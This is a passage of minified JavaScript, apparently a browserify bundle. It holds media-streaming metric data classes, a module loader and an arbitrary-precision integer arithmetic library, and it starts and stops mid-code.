p.flags,this.samples=p.samples,p.samples){this.samples=[],l=0;for(var f=p.samples.length;l<f;l++)this.samples.push({sample_size:p.samples[l].sample_size,sample_duration:p.samples[l].sample_duration,sample_composition_time_offset:p.samples[l].sample_composition_time_offset})}}}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),p=m,l=[{key:"getChildBox",value:function(p){for(var l=0;l<this.boxes.length;l++)if(this.boxes[l].type===p)return this.boxes[l]}},{key:"getChildBoxes",value:function(p){for(var l=[],f=0;f<this.boxes.length;f++)this.boxes[f].type===p&&l.push(this.boxes[f]);return l}}],l&&v(p.prototype,l),u=m,M.default=u,da.exports=M.default},{}],230:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function f(m,p,l){if(!(this instanceof f))throw new TypeError("Cannot call a class as a function");this.lastCompletedOffset=m,this.found=p,this.size=l},da.exports=M.default},{}],231:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.TcpList=[],this.HttpList=[],this.RepSwitchList=[],this.BufferLevel=[],this.BufferState=[],this.PlayList=[],this.DroppedFrames=[],this.SchedulingInfo=[],this.DVRInfo=[],this.ManifestUpdate=[],this.RequestsQueue=null,this.DVBErrors=[]},da.exports=M.default},{}],232:[function(u,da,M){function v(l){return l&&l.__esModule?l:{default:l}}function m(l,f){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");a:{for(var g=Object.getPrototypeOf(m.prototype),t="constructor",r=this,x=!0;x;){if(null===g&&(g=Function.prototype),void 0!==(x=Object.getOwnPropertyDescriptor(g,t))){if("value"in x){r=x.value;break a}if(void 0===(t=x.get))break;r=t.call(r);break a}if(null===(g=Object.getPrototypeOf(g)))break;x=!0}r=void 0}r.call(this),this.url=l||null,this.type=f||null,this.mediaType=p.default.STREAM,this.responseType=""}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108));(function(l,f){if("function"!=typeof f&&null!==f)throw new TypeError("Super expression must either be null or a function, not "+typeof f);l.prototype=Object.create(f&&f.prototype,{constructor:{value:l,enumerable:!1,writable:!0,configurable:!0}}),f&&(Object.setPrototypeOf?Object.setPrototypeOf(l,f):l.__proto__=f)})(m,v(u(227)).default),u=m,M.default=u,da.exports=M.default},{108:108,227:227}],233:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.lang=this.label=this.captionData=null,this.defaultTrack=!1,this.kind=null,this.isEmbedded=this.isFragmented=!1},da.exports=M.default},{}],234:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.y=this.x=this.height=this.width=this.url=null},da.exports=M.default},{}],235:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.timescale=this.segmentDuration=this.startNumber=this.heightPerTile=this.widthPerTile=this.tilesVert=this.tilesHor=this.height=this.width=this.bitrate=0,this.id=this.templateUrl=""},da.exports=M.default},{}],236:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.r=this.s=this.id=this.track=this.xywh=this.t=null},da.exports=M.default},{}],237:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.level=this.t=null},da.exports=M.default},{}],238:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0});var v,m=(v=u(109))&&v.__esModule?v:{default:v};M.default=function l(){if(!(this instanceof l))throw new TypeError("Cannot call a class as a function");this.target=null,this.state=m.default.BUFFER_EMPTY},da.exports=M.default},{109:109}],239:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.manifestInfo=this.range=this.time=null},da.exports=M.default},{}],240:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.droppedFrames=this.time=null},da.exports=M.default},{}],241:[function(u,da,M){function v(p,l){if(!(p instanceof l))throw new TypeError("Cannot call a class as a function")}function m(){v(this,m),this.interval=this.responsecode=this.tresponse=this.trequest=this.range=this.actualurl=this.url=this.type=this.tcpid=null,this.trace=[],this._serviceLocation=this._responseHeaders=this._quality=this._mediaduration=this._tfinish=this._stream=null}Object.defineProperty(M,"__esModule",{value:!0}),m.GET="GET",m.HEAD="HEAD",m.MPD_TYPE="MPD",m.XLINK_EXPANSION_TYPE="XLinkExpansion",m.INIT_SEGMENT_TYPE="InitializationSegment",m.INDEX_SEGMENT_TYPE="IndexSegment",m.MEDIA_SEGMENT_TYPE="MediaSegment",m.BITSTREAM_SWITCHING_SEGMENT_TYPE="BitstreamSwitchingSegment",m.OTHER_TYPE="other",M.HTTPRequest=m,M.HTTPRequestTrace=function l(){v(this,l),this.d=this.s=null,this.b=[]}},{}],242:[function(u,da,M){function v(m,p){if(!(m instanceof p))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(M,"__esModule",{value:!0}),M.ManifestUpdate=function p(){v(this,p),this.availabilityStartTime=this.fetchTime=this.requestTime=this.type=this.mediaType=null,this.clientTimeOffset=this.presentationStartTime=0,this.buffered=this.currentTime=null,this.latency=0,this.streamInfo=[],this.representationInfo=[]},M.ManifestUpdateStreamInfo=function l(){v(this,l),this.duration=this.start=this.index=this.id=null},M.ManifestUpdateRepresentationInfo=function f(){v(this,f),this.fragmentInfoType=this.startNumber=this.presentationTimeOffset=this.streamIndex=this.mediaType=this.index=this.id=null}},{}],243:[function(u,da,M){function v(l,f){if(!(l instanceof f))throw new TypeError("Cannot call a class as a function")}function m(){v(this,m),this.starttype=this.mstart=this.start=null,this.trace=[]}function p(){v(this,p),this.stopreason=this.playbackspeed=this.duration=this.mstart=this.start=this.subreplevel=this.representationid=null}Object.defineProperty(M,"__esModule",{value:!0}),m.INITIAL_PLAYOUT_START_REASON="initial_playout",m.SEEK_START_REASON="seek",m.RESUME_FROM_PAUSE_START_REASON="resume",m.METRICS_COLLECTION_START_REASON="metrics_collection_start",p.REPRESENTATION_SWITCH_STOP_REASON="representation_switch",p.REBUFFERING_REASON="rebuffering",p.USER_REQUEST_STOP_REASON="user_request",p.END_OF_PERIOD_STOP_REASON="end_of_period",p.END_OF_CONTENT_STOP_REASON="end_of_content",p.METRICS_COLLECTION_STOP_REASON="metrics_collection_end",p.FAILURE_STOP_REASON="failure",M.PlayList=m,M.PlayListTrace=p},{}],244:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.lto=this.to=this.mt=this.t=null},da.exports=M.default},{}],245:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.loadingRequests=[],this.executedRequests=[]},da.exports=M.default},{}],246:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.state=this.range=this.quality=this.duration=this.availabilityStartTime=this.startTime=this.type=this.t=this.mediaType=null},da.exports=M.default},{}]},{},[4]),function m(da,M,v){function p(g,t){if(!M[g]){if(!da[g]){var r="function"==typeof require&&require;if(!t&&r)return r(g,!0);if(l)return l(g,!0);throw(t=Error("Cannot find module '"+g+"'")).code="MODULE_NOT_FOUND",t}t=M[g]={exports:{}},da[g][0].call(t.exports,(function(x){return p(da[g][1][x]||x)}),t,t.exports,m,da,M,v)}return M[g].exports}for(var l="function"==typeof require&&require,f=0;f<v.length;f++)p(v[f]);return p}({1:[function(da,M,v){var m=function(p){function l(C,fa,qa,va){if(void 0===C)fa=l[0];else if(void 0===fa||10==+fa&&!qa)fa=S(C);else{var xa=qa||"0123456789abcdefghijklmnopqrstuvwxyz";C=String(C),va||(C=C.toLowerCase(),xa=xa.toLowerCase());var Ba,za=C.length,Ca=Math.abs(fa);for(va={},qa=0;qa<xa.length;qa++)va[xa[qa]]=qa;for(qa=0;qa<za;qa++)if("-"!==(Ba=C[qa])&&Ba in va&&va[Ba]>=Ca&&("1"!==Ba||1!==Ca))throw Error(Ba+" is not a valid digit in base "+fa+".");for(fa=S(fa),xa=[],qa=(za="-"===C[0])?1:0;qa<C.length;qa++)if((Ba=C[qa])in va)xa.push(S(va[Ba]));else{if("<"!==Ba)throw Error(Ba+" is not a valid character");for(Ba=qa;">"!==C[++qa]&&qa<C.length;);xa.push(S(C.slice(Ba+1,qa)))}fa=na(xa,fa,za)}return fa}function f(C,fa){this.value=C,this.sign=fa,this.isSmall=!1}function g(C){this.value=C,this.sign=0>C,this.isSmall=!0}function t(C){this.value=C}function r(C){return-9007199254740992<C&&9007199254740992>C}function x(C){return 1e7>C?[C]:1e14>C?[C%1e7,Math.floor(C/1e7)]:[C%1e7,Math.floor(C/1e7)%1e7,Math.floor(C/1e14)]}function z(C){J(C);var fa=C.length;if(4>fa&&0>W(C,V))switch(fa){case 0:return 0;case 1:return C[0];case 2:return C[0]+1e7*C[1];default:return C[0]+1e7*(C[1]+1e7*C[2])}return C}function J(C){for(var fa=C.length;0===C[--fa];);C.length=fa+1}function E(C){for(var fa=Array(C),qa=-1;++qa<C;)fa[qa]=0;return fa}function D(C){return 0<C?Math.floor(C):Math.ceil(C)}function I(C,fa){for(var qa,va=C.length,xa=fa.length,za=Array(va),Ca=0,Ba=0;Ba<xa;Ba++)Ca=1e7<=(qa=C[Ba]+fa[Ba]+Ca)?1:0,za[Ba]=qa-1e7*Ca;for(;Ba<va;)Ca=1e7===(qa=C[Ba]+Ca)?1:0,za[Ba++]=qa-1e7*Ca;return 0<Ca&&za.push(Ca),za}function L(C,fa){return C.length>=fa.length?I(C,fa):I(fa,C)}function G(C,fa){for(var qa,va=C.length,xa=Array(va),za=0;za<va;za++)qa=C[za]-1e7+fa,fa=Math.floor(qa/1e7),xa[za]=qa-1e7*fa,fa+=1;for(;0<fa;)xa[za++]=fa%1e7,fa=Math.floor(fa/1e7);return xa}function N(C,fa){for(var qa,va=C.length,xa=fa.length,za=Array(va),Ca=0,Ba=0;Ba<xa;Ba++)Ca=0>(qa=C[Ba]-Ca-fa[Ba])?(qa+=1e7,1):0,za[Ba]=qa;for(Ba=xa;Ba<va;Ba++){if(!(0>(qa=C[Ba]-Ca))){za[Ba++]=qa;break}qa+=1e7,za[Ba]=qa}for(;Ba<va;Ba++)za[Ba]=C[Ba];return J(za),za}function w(C,fa,qa){for(var va=C.length,xa=Array(va),za=-fa,Ca=0;Ca<va;Ca++)fa=C[Ca]+za,za=Math.floor(fa/1e7),fa%=1e7,xa[Ca]=0>fa?fa+1e7:fa;return"number"==typeof(xa=z(xa))?(qa&&(xa=-xa),new g(xa)):new f(xa,qa)}function h(C,fa){for(var qa,va,xa,za=C.length,Ca=fa.length,Ba=E(za+Ca),Ga=0;Ga<za;++Ga){xa=C[Ga];for(var Ra=0;Ra<Ca;++Ra)qa=xa*fa[Ra]+Ba[Ga+Ra],va=Math.floor(qa/1e7),Ba[Ga+Ra]=qa-1e7*va,Ba[Ga+Ra+1]+=va}return J(Ba),Ba}function F(C,fa){for(var qa,va=C.length,xa=Array(va),za=0,Ca=0;Ca<va;Ca++)qa=C[Ca]*fa+za,za=Math.floor(qa/1e7),xa[Ca]=qa-1e7*za;for(;0<za;)xa[Ca++]=za%1e7,za=Math.floor(za/1e7);return xa}function P(C,fa){for(var qa=[];0<fa--;)qa.push(0);return qa.concat(C)}function O(C,fa,qa){return new f(1e7>C?F(fa,C):h(fa,x(C)),qa)}function R(C){for(var fa,qa,va,xa=C.length,za=E(xa+xa),Ca=0;Ca<xa;Ca++){qa=-(va=C[Ca])*va;for(var Ba=Ca;Ba<xa;Ba++)fa=va*C[Ba]*2+za[Ca+Ba]+qa,qa=Math.floor(fa/1e7),za[Ca+Ba]=fa-1e7*qa;za[Ca+xa]=qa}return J(za),za}function Q(C,fa){for(var qa,va=C.length,xa=E(va),za=0,Ca=va-1;0<=Ca;--Ca)za=(qa=1e7*za+C[Ca])-(va=D(qa/fa))*fa,xa[Ca]=0|va;return[xa,0|za]}function ja(C,fa){if(fa=S(fa),oa)return[new t(C.value/fa.value),new t(C.value%fa.value)];var qa=C.value,va=fa.value;if(0===va)throw Error("Cannot divide by zero");if(C.isSmall)return fa.isSmall?[new g(D(qa/va)),new g(qa%va)]:[l[0],C];if(fa.isSmall){if(1===va)return[C,l[0]];if(-1==va)return[C.negate(),l[0]];if(1e7>(va=Math.abs(va)))return qa=z((va=Q(qa,va))[0]),va=va[1],C.sign&&(va=-va),"number"==typeof qa?(C.sign!==fa.sign&&(qa=-qa),[new g(qa),new g(va)]):[new f(qa,C.sign!==fa.sign),new g(va)];va=x(va)}var xa=W(qa,va);return-1===xa?[l[0],C]:0===xa?[l[C.sign===fa.sign?1:-1],l[0]]:(qa=(va=(200>=qa.length+va.length?function(za,Ca){var Ba,Ga,Ra,La=za.length,Ya=Ca.length,hb=E(Ca.length),bb=Ca[Ya-1],Da=Math.ceil(1e7/(2*bb));for(za=F(za,Da),Ca=F(Ca,Da),za.length<=La&&za.push(0),Ca.push(0),bb=Ca[Ya-1],Ba=La-Ya;0<=Ba;Ba--){La=9999999,za[Ba+Ya]!==bb&&(La=Math.floor((1e7*za[Ba+Ya]+za[Ba+Ya-1])/bb));var Pa=Ga=0,eb=Ca.length;for(Ra=0;Ra<eb;Ra++){Ga+=La*Ca[Ra];var Ta=Math.floor(Ga/1e7);Pa+=za[Ba+Ra]-(Ga-1e7*Ta),Ga=Ta,Pa=0>Pa?(za[Ba+Ra]=Pa+1e7,-1):(za[Ba+Ra]=Pa,0)}for(;0!==Pa;){for(--La,Ra=Ga=0;Ra<eb;Ra++)Ga=0>(Ga+=za[Ba+Ra]-1e7+Ca[Ra])?(za[Ba+Ra]=Ga+1e7,0):(za[Ba+Ra]=Ga,1);Pa+=Ga}hb[Ba]=La}return za=Q(za,Da)[0],[z(hb),z(za)]}:function(za,Ca){for(var Ba,Ga,Ra,La=za.length,Ya=Ca.length,hb=[],bb=[];La;)if(bb.unshift(za[--La]),J(bb),0>W(bb,Ca))hb.push(0);else{Ba=1e7*bb[(Ga=bb.length)-1]+bb[Ga-2],Ra=1e7*Ca[Ya-1]+Ca[Ya-2],Ya<Ga&&(Ba=1e7*(Ba+1)),Ba=Math.ceil(Ba/Ra);do{if(0>=W(Ra=F(Ca,Ba),bb))break;Ba--}while(Ba);hb.push(Ba),bb=N(bb,Ra)}return hb.reverse(),[z(hb),z(bb)]})(qa,va))[0],fa=C.sign!==fa.sign,va=va[1],C=C.sign,[qa="number"==typeof qa?(fa&&(qa=-qa),new g(qa)):new f(qa,fa),va="number"==typeof va?(C&&(va=-va),new g(va)):new f(va,C)])}function W(C,fa){if(C.length!==fa.length)return C.length>fa.length?1:-1;for(var qa=C.length-1;0<=qa;qa--)if(C[qa]!==fa[qa])return C[qa]>fa[qa]?1:-1;return 0}function aa(C){return!(C=C.abs()).isUnit()&&(!!(C.equals(2)||C.equals(3)||C.equals(5))||!(C.isEven()||C.isDivisibleBy(3)||C.isDivisibleBy(5))&&(!!C.lesser(49)||void 0))}function ma(C,fa){for(var qa,va,xa,za=C.prev(),Ca=za,Ba=0;Ca.isEven();)Ca=Ca.divide(2),Ba++;va=0;a:for(;va<fa.length;va++)if(!C.lesser(fa[va])&&!(xa=m(fa[va]).modPow(Ca,C)).isUnit()&&!xa.equals(za)){for(qa=Ba-1;0!=qa&&!(xa=xa.square().mod(C)).isUnit();qa--)if(xa.equals(za))continue a;return!1}return!0}function H(C,fa,qa){fa=S(fa);var va=C.isNegative(),xa=fa.isNegative();C=va?C.not():C;var za=xa?fa.not():fa;for(fa=[];!C.isZero()||!za.isZero();){var Ca=(C=ja(C,ka))[1].toJSNumber();va&&(Ca=ka-1-Ca);var Ba=(za=ja(za,ka))[1].toJSNumber();xa&&(Ba=ka-1-Ba),C=C[0],za=za[0],fa.push(qa(Ca,Ba))}for(qa=0!==qa(va?1:0,xa?1:0)?m(-1):m(0),va=fa.length-1;0<=va;--va)qa=qa.multiply(ka).add(m(fa[va]));return qa}function B(C){return(C="number"==typeof(C=C.value)?1073741824|C:"bigint"==typeof C?C|BigInt(1073741824):C[0]+1e7*C[1]|1073758208)&-C}function A(C,fa){return C=S(C),fa=S(fa),C.greater(fa)?C:fa}function Y(C,fa){return C=S(C),fa=S(fa),C.lesser(fa)?C:fa}function Z(C,fa){if(C=S(C).abs(),fa=S(fa).abs(),C.equals(fa))return C;if(C.isZero())return fa;if(fa.isZero())return C;for(var qa,va,xa=l[1];C.isEven()&&fa.isEven();)qa=Y(B(C),B(fa)),C=C.divide(qa),fa=fa.divide(qa),xa=xa.multiply(qa);for(;C.isEven();)C=C.divide(B(C));do{for(;fa.isEven();)fa=fa.divide(B(fa));C.greater(fa)&&(va=fa,fa=C,C=va),fa=fa.subtract(C)}while(!fa.isZero());return xa.isUnit()?C:C.multiply(xa)}function na(C,fa,qa){for(var va=l[0],xa=l[1],za=C.length-1;0<=za;za--)va=va.add(C[za].times(xa)),xa=xa.times(fa);return qa?va.negate():va}function T(C,fa){if((fa=m(fa)).isZero()){if(C.isZero())return{value:[0],isNegative:!1};throw Error("Cannot convert nonzero numbers to base 0.")}if(fa.equals(-1))return C.isZero()?{value:[0],isNegative:!1}:C.isNegative()?{value:[].concat.apply([],Array.apply(null,Array(-C.toJSNumber())).map(Array.prototype.valueOf,[1,0])),isNegative:!1}:((fa=Array.apply(null,Array(C.toJSNumber()-1)).map(Array.prototype.valueOf,[0,1])).unshift([1]),{value:[].concat.apply([],fa),isNegative:!1});var qa=!1;if(C.isNegative()&&fa.isPositive()&&(qa=!0,C=C.abs()),fa.isUnit())return C.isZero()?{value:[0],isNegative:!1}:{value:Array.apply(null,Array(C.toJSNumber())).map(Number.prototype.valueOf,1),isNegative:qa};for(var va,xa=[];C.isNegative()||0<=C.compareAbs(fa);)C=(va=C.divmod(fa)).quotient,(va=va.remainder).isNegative()&&(va=fa.minus(va).abs(),C=C.next()),xa.push(va.toJSNumber());return xa.push(C.toJSNumber()),{value:xa.reverse(),isNegative:qa}}function pa(C,fa,qa){return((C=T(C,fa)).isNegative?"-":"")+C.value.map((function(va){return(xa=va)<(za=(za=qa)||"0123456789abcdefghijklmnopqrstuvwxyz").length?za[xa]:"<"+xa+">";var xa,za})).join("")}function ia(C){if(r(+C)){var fa=+C;if(fa===D(fa))return oa?new t(BigInt(fa)):new g(fa);throw Error("Invalid integer: "+C)}(fa="-"===C[0])&&(C=C.slice(1));var qa=C.split(/e/i);if(2<qa.length)throw Error("Invalid integer: "+qa.join("e"));if(2===qa.length){if("+"===(C=qa[1])[0]&&(C=C.slice(1)),(C=+C)!==D(C)||!r(C))throw Error("Invalid integer: "+C+" is not a valid exponent.");var va=(qa=qa[0]).indexOf(".");if(0<=va&&(C-=qa.length-va-1,qa=qa.slice(0,va)+qa.slice(va+1)),0>C)throw Error("Cannot include negative exponent part for integers");C=qa+Array(C+1).join("0")}if(!/^([0-9][0-9]*)$/.test(C))throw Error("Invalid integer: "+C);if(oa)return new t(BigInt(fa?"-"+C:C));qa=[];for(var xa=(va=C.length)-7;0<va;)qa.push(+C.slice(xa,va)),0>(xa-=7)&&(xa=0),va-=7;return J(qa),new f(qa,fa)}function S(C){if("number"==typeof C)if(oa)C=new t(BigInt(C));else if(r(C)){if(C!==D(C))throw Error(C+" is not an integer.");C=new g(C)}else C=ia(C.toString());else C="string"==typeof C?ia(C):"bigint"==typeof C?new t(C):C;return C}var V=x(9007199254740992),oa="function"==typeof BigInt;f.prototype=Object.create(l.prototype),g.prototype=Object.create(l.prototype),t.prototype=Object.create(l.prototype),f.prototype.plus=f.prototype.add=function(C){if(C=S(C),this.sign!==C.sign)return this.subtract(C.negate());var fa=this.value,qa=C.value;return C.isSmall?new f(G(fa,Math.abs(qa)),this.sign):new f(L(fa,qa),this.sign)},g.prototype.plus=g.prototype.add=function(C){C=S(C);var fa=this.value;if(0>fa!==C.sign)return this.subtract(C.negate());var qa=C.value;if(C.isSmall){if(r(fa+qa))return new g(fa+qa);qa=x(Math.abs(qa))}return new f(G(qa,Math.abs(fa)),0>fa)},t.prototype.plus=t.prototype.add=function(C){return new t(this.value+S(C).value)},f.prototype.minus=f.prototype.subtract=function(C){if(C=S(C),this.sign!==C.sign)return this.add(C.negate());var fa,qa,va=this.value,xa=C.value;return C.isSmall?w(va,Math.abs(xa),this.sign):(fa=this.sign,0<=W(va,xa)?qa=N(va,xa):(qa=N(xa,va),fa=!fa),"number"==typeof(qa=z(qa))?(fa&&(qa=-qa),new g(qa)):new f(qa,fa))},g.prototype.minus=g.prototype.subtract=function(C){C=S(C);var fa=this.value;if(0>fa!==C.sign)return this.add(C.negate());var qa=C.value;return C.isSmall?new g(fa-qa):w(qa,Math.abs(fa),0<=fa)},t.prototype.minus=t.prototype.subtract=function(C){return new t(this.value-S(C).value)},f.prototype.negate=function(){return new f(this.value,!this.sign)},g.prototype.negate=function(){var C=this.sign,fa=new g(-this.value);return fa.sign=!C,fa},t.prototype.negate=function(){return new t(-this.value)},f.prototype.abs=function(){return new f(this.value,!1)},g.prototype.abs=function(){return new g(Math.abs(this.value))},t.prototype.abs=function(){return new t(0<=this.value?this.value:-this.value)},f.prototype.times=f.prototype.multiply=function(C){var fa,qa,va=S(C);C=this.value;var xa=va.value,za=this.sign!==va.sign;if(va.isSmall){if(0===xa)return l[0];if(1===xa)return this;if(-1===xa)return this.negate();if(1e7>(va=Math.abs(xa)))return new f(F(C,va),za);xa=x(va)}return new f((0<-.012*(fa=C.length)-.012*(qa=xa.length)+15e-6*fa*qa?function Ra(Ba,Ga){var La=Math.max(Ba.length,Ga.length);if(30>=La)return h(Ba,Ga);La=Math.ceil(La/2);var Ya=Ba.slice(La);Ba=Ba.slice(0,La);var hb=Ga.slice(La),bb=Ga.slice(0,La);Ga=Ra(Ba,bb);var Da=Ra(Ya,hb);return Ya=Ra(L(Ba,Ya),L(bb,hb)),J(La=L(L(Ga,P(N(N(Ya,Ga),Da),La)),P(Da,2*La))),La}:h)(C,xa),za)},g.prototype._multiplyBySmall=function(C){return r(C.value*this.value)?new g(C.value*this.value):O(Math.abs(C.value),x(Math.abs(this.value)),this.sign!==C.sign)},f.prototype._multiplyBySmall=function(C){return 0===C.value?l[0]:1===C.value?this:-1===C.value?this.negate():O(Math.abs(C.value),this.value,this.sign!==C.sign)},g.prototype.times=g.prototype.multiply=function(C){return S(C)._multiplyBySmall(this)},t.prototype.times=t.prototype.multiply=function(C){return new t(this.value*S(C).value)},f.prototype.square=function(){return new f(R(this.value),!1)},g.prototype.square=function(){var C=this.value*this.value;return r(C)?new g(C):new f(R(x(Math.abs(this.value))),!1)},t.prototype.square=function(C){return new t(this.value*this.value)},t.prototype.divmod=g.prototype.divmod=f.prototype.divmod=function(C){return{quotient:(C=ja(this,C))[0],remainder:C[1]}},f.prototype.divide=function(C){return ja(this,C)[0]},t.prototype.over=t.prototype.divide=function(C){return new t(this.value/S(C).value)},g.prototype.over=g.prototype.divide=f.prototype.over=f.prototype.divide,f.prototype.mod=function(C){return ja(this,C)[1]},t.prototype.mod=t.prototype.remainder=function(C){return new t(this.value%S(C).value)},g.prototype.remainder=g.prototype.mod=f.prototype.remainder=f.prototype.mod,f.prototype.pow=function(C){var fa,qa=S(C),va=this.value;if(0===(C=qa.value))return l[1];if(0===va)return l[0];if(1===va)return l[1];if(-1===va)return qa.isEven()?l[1]:l[-1];if(qa.sign)return l[0];if(!qa.isSmall)throw Error("The exponent "+qa.toString()+" is too large.");if(this.isSmall&&r(fa=Math.pow(va,C)))return new g(D(fa));for(fa=this,qa=l[1];1&C&&(qa=qa.times(fa),--C),0!==C;)C/=2,fa=fa.square();return qa},g.prototype.pow=f.prototype.pow,t.prototype.pow=function(C){var fa=S(C),qa=this.value;C=fa.value;var va=BigInt(0),xa=BigInt(1),za=BigInt(2);if(C===va)return l[1];if(qa===va)return l[0];if(qa===xa)return l[1];if(qa===BigInt(-1))return fa.isEven()?l[1]:l[-1];if(fa.isNegative())return new t(va);for(fa=this,qa=l[1];(C&xa)===xa&&(qa=qa.times(fa),--C),C!==va;)C/=za,fa=fa.square();return qa},t.prototype.modPow=g.prototype.modPow=f.prototype.modPow=function(C,fa){if(C=S(C),(fa=S(fa)).isZero())throw Error("Cannot take modPow with modulus 0");for(var qa=l[1],va=this.mod(fa);C.isPositive();){if(va.isZero())return l[0];C.isOdd()&&(qa=qa.multiply(va).mod(fa)),C=C.divide(2),va=va.square().mod(fa)}return qa},f.prototype.compareAbs=function(C){C=S(C);var fa=this.value,qa=C.value;return C.isSmall?1:W(fa,qa)},g.prototype.compareAbs=function(C){C=S(C);var fa=Math.abs(this.value),qa=C.value;return C.isSmall?fa===(qa=Math.abs(qa))?0:qa<fa?1:-1:-1},t.prototype.compareAbs=function(C){var fa=this.value;return(fa=0<=fa?fa:-fa)===(C=0<=(C=S(C).value)?C:-C)?0:C<fa?1:-1},f.prototype.compareTo=f.prototype.compare=function(C){if(C===1/0)return-1;if(C===-1/0)return 1;C=S(C);var fa=this.value,qa=C.value;return this.sign!==C.sign?C.sign?1:-1:C.isSmall?this.sign?-1:1:W(fa,qa)*(this.sign?-1:1)},g.prototype.compareTo=g.prototype.compare=function(C){if(C===1/0)return-1;if(C===-1/0)return 1;C=S(C);var fa=this.value,qa=C.value;return C.isSmall?fa==qa?0:qa<fa?1:-1:0>fa!==C.sign?0>fa?-1:1:0>fa?1:-1},t.prototype.compareTo=t.prototype.compare=function(C){if(C===1/0)return-1;if(C===-1/0)return 1;var fa=this.value;return fa===(C=S(C).value)?0:C<fa?1:-1},t.prototype.eq=t.prototype.equals=g.prototype.eq=g.prototype.equals=f.prototype.eq=f.prototype.equals=function(C){return 0===this.compare(C)},t.prototype.neq=t.prototype.notEquals=g.prototype.neq=g.prototype.notEquals=f.prototype.neq=f.prototype.notEquals=function(C){return 0!==this.compare(C)},t.prototype.gt=t.prototype.greater=g.prototype.gt=g.prototype.greater=f.prototype.gt=f.prototype.greater=function(C){return 0<this.compare(C)},t.prototype.lt=t.prototype.lesser=g.prototype.lt=g.prototype.lesser=f.prototype.lt=f.prototype.lesser=function(C){return 0>this.compare(C)},t.prototype.geq=t.prototype.greaterOrEquals=g.prototype.geq=g.prototype.greaterOrEquals=f.prototype.geq=f.prototype.greaterOrEquals=function(C){return 0<=this.compare(C)},t.prototype.leq=t.prototype.lesserOrEquals=g.prototype.leq=g.prototype.lesserOrEquals=f.prototype.leq=f.prototype.lesserOrEquals=function(C){return 0>=this.compare(C)},f.prototype.isEven=function(){return!(1&this.value[0])},g.prototype.isEven=function(){return!(1&this.value)},t.prototype.isEven=function(){return(this.value&BigInt(1))===BigInt(0)},f.prototype.isOdd=function(){return!(1&~this.value[0])},g.prototype.isOdd=function(){return!(1&~this.value)},t.prototype.isOdd=function(){return(this.value&BigInt(1))===BigInt(1)},f.prototype.isPositive=function(){return!this.sign},t.prototype.isPositive=g.prototype.isPositive=function(){return 0<this.value},f.prototype.isNegative=function(){return this.sign},t.prototype.isNegative=g.prototype.isNegative=function(){return 0>this.value},f.prototype.isUnit=function(){return!1},g.prototype.isUnit=function(){return 1===Math.abs(this.value)},t.prototype.isUnit=function(){return this.abs().value===BigInt(1)},f.prototype.isZero=function(){return!1},g.prototype.isZero=function(){return 0===this.value},t.prototype.isZero=function(){return this.value===BigInt(0)},t.prototype.isDivisibleBy=g.prototype.isDivisibleBy=f.prototype.isDivisibleBy=function(C){return!(C=S(C)).isZero()&&(!!C.isUnit()||(0===C.compareAbs(2)?this.isEven():this.mod(C).isZero()))},t.prototype.isPrime=g.prototype.isPrime=f.prototype.isPrime=function(C){var fa=aa(this);if(fa!==p)return fa;var qa=(fa=this.abs()).bitLength();if(64>=qa)return ma(fa,[2,3,5,7,11,13,17,19,23,29,31,37]);qa=Math.log(2)*qa.toJSNumber(),C=Math.ceil(!0===C?2*Math.pow(qa,2):qa),qa=[];for(var va=0;va<C;va++)qa.push(m(va+2));return ma(fa,qa)},t.prototype.isProbablePrime=g.prototype.isProbablePrime=f.prototype.isProbablePrime=function(C){var fa=aa(this);if(fa!==p)return fa;fa=this.abs(),C=C===p?5:C;for(var qa=[],va=0;va<C;va++)qa.push(m.randBetween(2,fa.minus(2)));return ma(fa,qa)},t.prototype.modInv=g.prototype.modInv=f.prototype.modInv=function(C){for(var fa,qa,va,xa=m.zero,za=m.one,Ca=S(C),Ba=this.abs();!Ba.isZero();)fa=Ca.divide(Ba),qa=xa,va=Ca,xa=za,Ca=Ba,za=qa.subtract(fa.multiply(za)),Ba=va.subtract(fa.multiply(Ba));if(!Ca.isUnit())throw Error(this.toString()+" and "+C.toString()+" are not co-prime");return-1===xa.compare(0)&&(xa=xa.add(C)),this.isNegative()?xa.negate():xa},f.prototype.next=function(){var C=this.value;return this.sign?w(C,1,this.sign):new f(G(C,1),this.sign)},g.prototype.next=function(){var C=this.value;return 9007199254740992>C+1?new g(C+1):new f(V,!1)},t.prototype.next=function(){return new t(this.value+BigInt(1))},f.prototype.prev=function(){var C=this.value;return this.sign?new f(G(C,1),!0):w(C,1,this.sign)},g.prototype.prev=function(){var C=this.value;return-9007199254740992<C-1?new g(C-1):new f(V,!0)},t.prototype.prev=function(){return new t(this.value-BigInt(1))};for(var ba=[1];1e7>=2*ba[ba.length-1];)ba.push(2*ba[ba.length-1]);var 